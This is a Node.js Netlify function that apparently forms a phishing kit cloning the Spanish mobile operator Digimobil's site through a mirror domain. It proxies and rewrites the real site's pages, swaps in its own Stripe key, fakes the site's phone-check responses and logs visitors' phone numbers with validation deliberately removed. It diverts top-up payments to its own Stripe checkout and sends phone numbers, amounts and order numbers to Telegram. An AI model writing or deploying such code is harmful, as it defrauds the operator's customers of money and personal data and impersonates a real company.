const fetch = require('node-fetch');
const { URL } = require('url');
const { Response } = require('node-fetch');
const { Headers } = require('node-fetch');

// Импортируем наши утилиты
const storage = require('../db/storage');
const telegram = require('./telegram');
const stripeUtils = require('./stripe');
const htmlModifier = require('./html-modifier');
const proxyUtils = require('./proxy');

// Конфигурация
const SOURCE_DOMAIN = 'www.digimobil.es';
const MIRROR_DOMAIN = process.env.NETLIFY_SITE_URL || 'digimobile-mirror.netlify.app';
const STRIPE_PUBLISHABLE_KEY = process.env.STRIPE_PUBLISHABLE_KEY;

// Основная функция обработки запросов
exports.handler = async function(event, context) {
  // Получаем информацию о запросе
  const httpMethod = event.httpMethod;
  const path = event.path;
  const url = new URL(event.rawUrl);
  const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';
  const headers = event.headers;
  
  console.log(`Handling ${httpMethod} request to ${path}`);

  // Обработка CORS preflight запросов
  if (httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Max-Age': '86400'
      },
      body: ''
    };
  }

  try {
    // Обработка специальных маршрутов
    if (path === '/.netlify/functions/api/store-phone' && httpMethod === 'POST') {
      try {
        const data = JSON.parse(event.body);
        const phoneNumber = data.phoneNumber;
        // Удалена валидация номера телефона
        await storage.storePhoneNumber(clientIP, phoneNumber);
        console.log('Stored phone number:', phoneNumber, 'for IP:', clientIP);
        return {
          statusCode: 200,
          body: JSON.stringify({ success: true, message: 'Phone number stored' })
        };
      } catch (e) {
        console.error('Error storing phone:', e);
        return {
          statusCode: 500,
          body: JSON.stringify({ success: false, message: 'Error storing phone number' })
        };
      }
    }

    if (path === '/payment-success' || path.endsWith('/payment-success')) {
      const sessionId = url.searchParams.get('session_id');
      
      let phoneNumber = await storage.getPhoneNumber(clientIP) || 'Not Provided';
      let terminal = 'Unknown';
      let amount = 'Unknown';
      let orderNumber = 'Unknown';

      console.log('Payment success - Session ID:', sessionId);
      
      if (sessionId) {
        const paymentData = await storage.getPaymentData(sessionId);
        if (paymentData) {
          phoneNumber = paymentData.phoneNumber;
          terminal = paymentData.terminal;
          amount = paymentData.amount;
          orderNumber = paymentData.orderNumber;
          console.log('Found payment data:', paymentData);
          await storage.markPaymentProcessed(sessionId);
        } else {
          console.log('No payment data found for session:', sessionId);
        }

        const sent = await telegram.sendToTelegram(phoneNumber, terminal, amount, orderNumber);
        if (!sent) {
          console.log('Initial Telegram send failed, retrying cached messages');
          await telegram.retryCachedTelegramMessages();
        }
      }

      const html = htmlModifier.createPaymentResultHTML('success', { phoneNumber, amount });
      
      return {
        statusCode: 200,
        headers: { 
          'Content-Type': 'text/html;charset=UTF-8', 
          'Access-Control-Allow-Origin': '*' 
        },
        body: html
      };
    }

    if (path === '/payment-cancel' || path.endsWith('/payment-cancel')) {
      const html = htmlModifier.createPaymentResultHTML('cancel');
      
      return {
        statusCode: 200,
        headers: { 
          'Content-Type': 'text/html;charset=UTF-8', 
          'Access-Control-Allow-Origin': '*' 
        },
        body: html
      };
    }

    if (path === '/.netlify/functions/api/create-payment' && httpMethod === 'POST') {
      try {
        const contentType = headers['content-type'] || '';
        let amount, phoneNumber, successUrl, cancelUrl;

        if (contentType.includes('application/json')) {
          const data = JSON.parse(event.body);
          amount = data.amount;
          phoneNumber = data.phoneNumber;
          successUrl = data.successUrl || `https://${MIRROR_DOMAIN}/payment-success`;
          cancelUrl = data.cancelUrl || `https://${MIRROR_DOMAIN}/payment-cancel`;
        } else if (contentType.includes('application/x-www-form-urlencoded')) {
          const params = new URLSearchParams(event.body);
          amount = params.get('amount');
          phoneNumber = params.get('phoneNumber');
          successUrl = params.get('successUrl') || `https://${MIRROR_DOMAIN}/payment-success`;
          cancelUrl = params.get('cancelUrl') || `https://${MIRROR_DOMAIN}/payment-cancel`;
        } else {
          return {
            statusCode: 400,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: 'Unsupported content type' })
          };
        }

        // Если номер телефона не найден, пытаемся получить из кэша, без валидации
        if (!phoneNumber) {
          const cachedPhone = await storage.getPhoneNumber(clientIP);
          if (cachedPhone) {
            phoneNumber = cachedPhone;
          }
        }

        // Удален код валидации номера телефона

        if (!amount || isNaN(amount)) {
          return {
            statusCode: 400,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: 'Invalid amount. Required: amount (number)' })
          };
        }

        console.log('Processing payment request:', { amount, phoneNumber, clientIP });

        const { session } = await stripeUtils.createStripeCheckoutSession(
          parseFloat(amount),
          phoneNumber,
          successUrl,
          cancelUrl,
          clientIP
        );

        return {
          statusCode: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*'
          },
          body: JSON.stringify({
            sessionId: session.id,
            url: session.url
          })
        };
      } catch (error) {
        console.error('Error in handlePaymentRequest:', error);
        return {
          statusCode: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          },
          body: JSON.stringify({ error: error.message })
        };
      }
    }

    if (path === '/.netlify/functions/api/check_number_no_captcha' || path === '/.netlify/functions/api/check_number') {
      try {
        let phoneNumber = '';
        const contentType = headers['content-type'] || '';

        if (contentType.includes('application/json')) {
          const data = JSON.parse(event.body);
          phoneNumber = data.phone?.first || '';
          // Сохраняем номер телефона без валидации
          if (phoneNumber) {
            await storage.storePhoneNumber(clientIP, phoneNumber);
          }
        } else if (contentType.includes('application/x-www-form-urlencoded')) {
          const params = new URLSearchParams(event.body);
          phoneNumber = params.get('check_number[phone][first]') || '';
          // Сохраняем номер телефона без валидации
          if (phoneNumber) {
            await storage.storePhoneNumber(clientIP, phoneNumber);
          }
        } else {
          try {
            const bodyContent = event.body;
            const phoneMatch = bodyContent.match(/phone[^0-9]*([0-9]{9})/i);
            if (phoneMatch && phoneMatch[1]) {
              phoneNumber = phoneMatch[1];
              // Сохраняем номер телефона без валидации
              await storage.storePhoneNumber(clientIP, phoneNumber);
            }
          } catch (e) { }
        }

        return {
          statusCode: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': '*'
          },
          body: JSON.stringify(proxyUtils.simulatePhoneCheckResponse(phoneNumber))
        };
      } catch (error) {
        // Если возникла ошибка при обработке номера, перенаправляем запрос на оригинальный сайт
        const url = new URL(event.rawUrl);
        const modifiedRequest = await proxyUtils.modifyApiRequest(event, url, SOURCE_DOMAIN);
        const response = await fetch(modifiedRequest);
        const responseData = await response.json();
        
        return {
          statusCode: response.status,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          },
          body: JSON.stringify(responseData)
        };
      }
    }

    if (path.startsWith('/.netlify/functions/api/store-backend')) {
      const originalUrl = path.replace('/.netlify/functions/api/store-backend', '');
      const newUrl = new URL(`https://${MIRROR_DOMAIN}${originalUrl}${url.search ? url.search : ''}`);
      
      try {
        const response = await proxyUtils.handleStoreBackend(event, newUrl);
        const responseBody = await response.text();
        
        return {
          statusCode: response.status,
          headers: Object.fromEntries(response.headers.entries()),
          body: responseBody
        };
      } catch (error) {
        console.error('Error handling store backend:', error);
        return {
          statusCode: 500,
          body: JSON.stringify({ error: 'Error proxying to store backend' })
        };
      }
    }

    if (path === '/.netlify/functions/api/retry-telegram') {
      try {
        const result = await telegram.retryCachedTelegramMessages();
        return {
          statusCode: 200,
          body: JSON.stringify(result)
        };
      } catch (error) {
        console.error('Error retrying Telegram messages:', error);
        return {
          statusCode: 500,
          body: JSON.stringify({ error: 'Error retrying Telegram messages' })
        };
      }
    }

    if (path === '/.netlify/functions/api/topup' || path.endsWith('/api/topup')) {
      try {
        const contentType = headers['content-type'] || '';
        let amount, phoneNumber;

        // Попытка получить данные из URL-параметров
        if (url.searchParams.has('phone') || url.searchParams.has('amount')) {
          phoneNumber = url.searchParams.get('phone') || url.searchParams.get('phone_number') || 
                      url.searchParams.get('msisdn') || url.searchParams.get('number');
          amount = url.searchParams.get('amount') || url.searchParams.get('topup_amount') || 
                  url.searchParams.get('value');
        }

        // Если данных в URL нет, попытка получить из тела
        if (!phoneNumber || !amount) {
          if (contentType.includes('application/x-www-form-urlencoded')) {
            const params = new URLSearchParams(event.body);
            phoneNumber = phoneNumber || params.get('phone') || params.get('phone_number') || 
                         params.get('msisdn') || params.get('number');
            amount = amount || params.get('amount') || params.get('topup_amount') || params.get('value');
          } else if (contentType.includes('application/json')) {
            const jsonData = JSON.parse(event.body);
            phoneNumber = phoneNumber || jsonData.phone || jsonData.phone_number || 
                         jsonData.msisdn || jsonData.number;
            amount = amount || jsonData.amount || jsonData.topup_amount || jsonData.value;
          }
        }

        // Если номер телефона не найден, пытаемся получить из кэша (без валидации)
        if (!phoneNumber) {
          const cachedPhone = await storage.getPhoneNumber(clientIP);
          if (cachedPhone) phoneNumber = cachedPhone;
        }

        // Удален код проверки валидности номера телефона

        // Устанавливаем стандартную сумму, если не указана
        amount = amount || '5';
        const numericAmount = parseFloat(amount);
        if (isNaN(numericAmount) || numericAmount <= 0) amount = '5';

        console.log('Processing topup request:', { amount, phoneNumber, clientIP });

        // Создаем сессию Stripe и перенаправляем на страницу оплаты
        const { session } = await stripeUtils.createStripeCheckoutSession(
          parseFloat(amount),
          phoneNumber,
          `https://${MIRROR_DOMAIN}/payment-success`,
          `https://${MIRROR_DOMAIN}/payment-cancel`,
          clientIP
        );

        if (session.url) {
          return {
            statusCode: 302,
            headers: {
              'Location': session.url,
              'Cache-Control': 'no-cache'
            },
            body: ''
          };
        }
        
        throw new Error('Failed to create Stripe checkout URL');
      } catch (error) {
        console.error('Error in handleTopupRequest:', error);
        return {
          statusCode: 302,
          headers: {
            'Location': `https://${MIRROR_DOMAIN}/recargar`,
            'Cache-Control': 'no-cache'
          },
          body: ''
        };
      }
    }

    // Для всех остальных запросов проксируем на оригинальный сайт
    const proxyHeaders = new Headers();
    for (const [key, value] of Object.entries(headers)) {
      if (!['host', 'origin', 'referer'].includes(key.toLowerCase())) {
        proxyHeaders.set(key, value);
      }
    }

    let bodyContent = null;
    if (['POST', 'PUT', 'PATCH'].includes(httpMethod)) {
      try {
        bodyContent = event.body;
      } catch (e) { 
        console.error('Error processing request body for proxy:', e);
      }
    }

    // Создаем прокси-запрос к оригинальному сайту
    const proxyUrl = `https://${SOURCE_DOMAIN}${url.pathname}${url.search}`;
    console.log(`Proxying request to: ${proxyUrl}`);
    
    const proxyRequest = new Request(proxyUrl, {
      method: httpMethod,
      headers: proxyHeaders,
      body: bodyContent,
      redirect: 'manual'
    });

    let response = await fetch(proxyRequest);
    
    // Обрабатываем редиректы
    if (response.status >= 300 && response.status < 400) {
      response = await proxyUtils.followRedirects(response, proxyHeaders);
    }

    const contentType = response.headers.get('Content-Type') || '';
    console.log('Proxy response:', { status: response.status, contentType, url: url.pathname });

    // Модифицируем HTML и JavaScript контент
    if (contentType.includes('text/html')) {
      const modifiedResponse = await htmlModifier.modifyHTML(
        response, 
        MIRROR_DOMAIN, 
        SOURCE_DOMAIN, 
        STRIPE_PUBLISHABLE_KEY
      );
      
      const body = await modifiedResponse.text();
      return {
        statusCode: modifiedResponse.status,
        headers: {
          'Content-Type': 'text/html;charset=UTF-8',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': '*'
        },
        body: body
      };
    }
    
    if (contentType.includes('javascript')) {
      const modifiedResponse = await htmlModifier.modifyJavaScript(
        response, 
        MIRROR_DOMAIN, 
        SOURCE_DOMAIN, 
        STRIPE_PUBLISHABLE_KEY
      );
      
      const body = await modifiedResponse.text();
      return {
        statusCode: modifiedResponse.status,
        headers: {
          'Content-Type': 'application/javascript',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': '*'
        },
        body: body
      };
    }

    // Для всех остальных типов контента просто возвращаем ответ от оригинального сайта
    const responseBody = await response.text();
    const responseHeaders = {};
    
    for (const [key, value] of response.headers.entries()) {
      responseHeaders[key] = value;
    }
    
    responseHeaders['Access-Control-Allow-Origin'] = '*';
    responseHeaders['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS';
    responseHeaders['Access-Control-Allow-Headers'] = '*';

    return {
      statusCode: response.status,
      headers: responseHeaders,
      body: responseBody
    };
  } catch (error) {
    console.error('Error handling request:', error);
    return {
      statusCode: 500,
      headers: { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' },
      body: `Error: ${error.message}`
    };
  }
};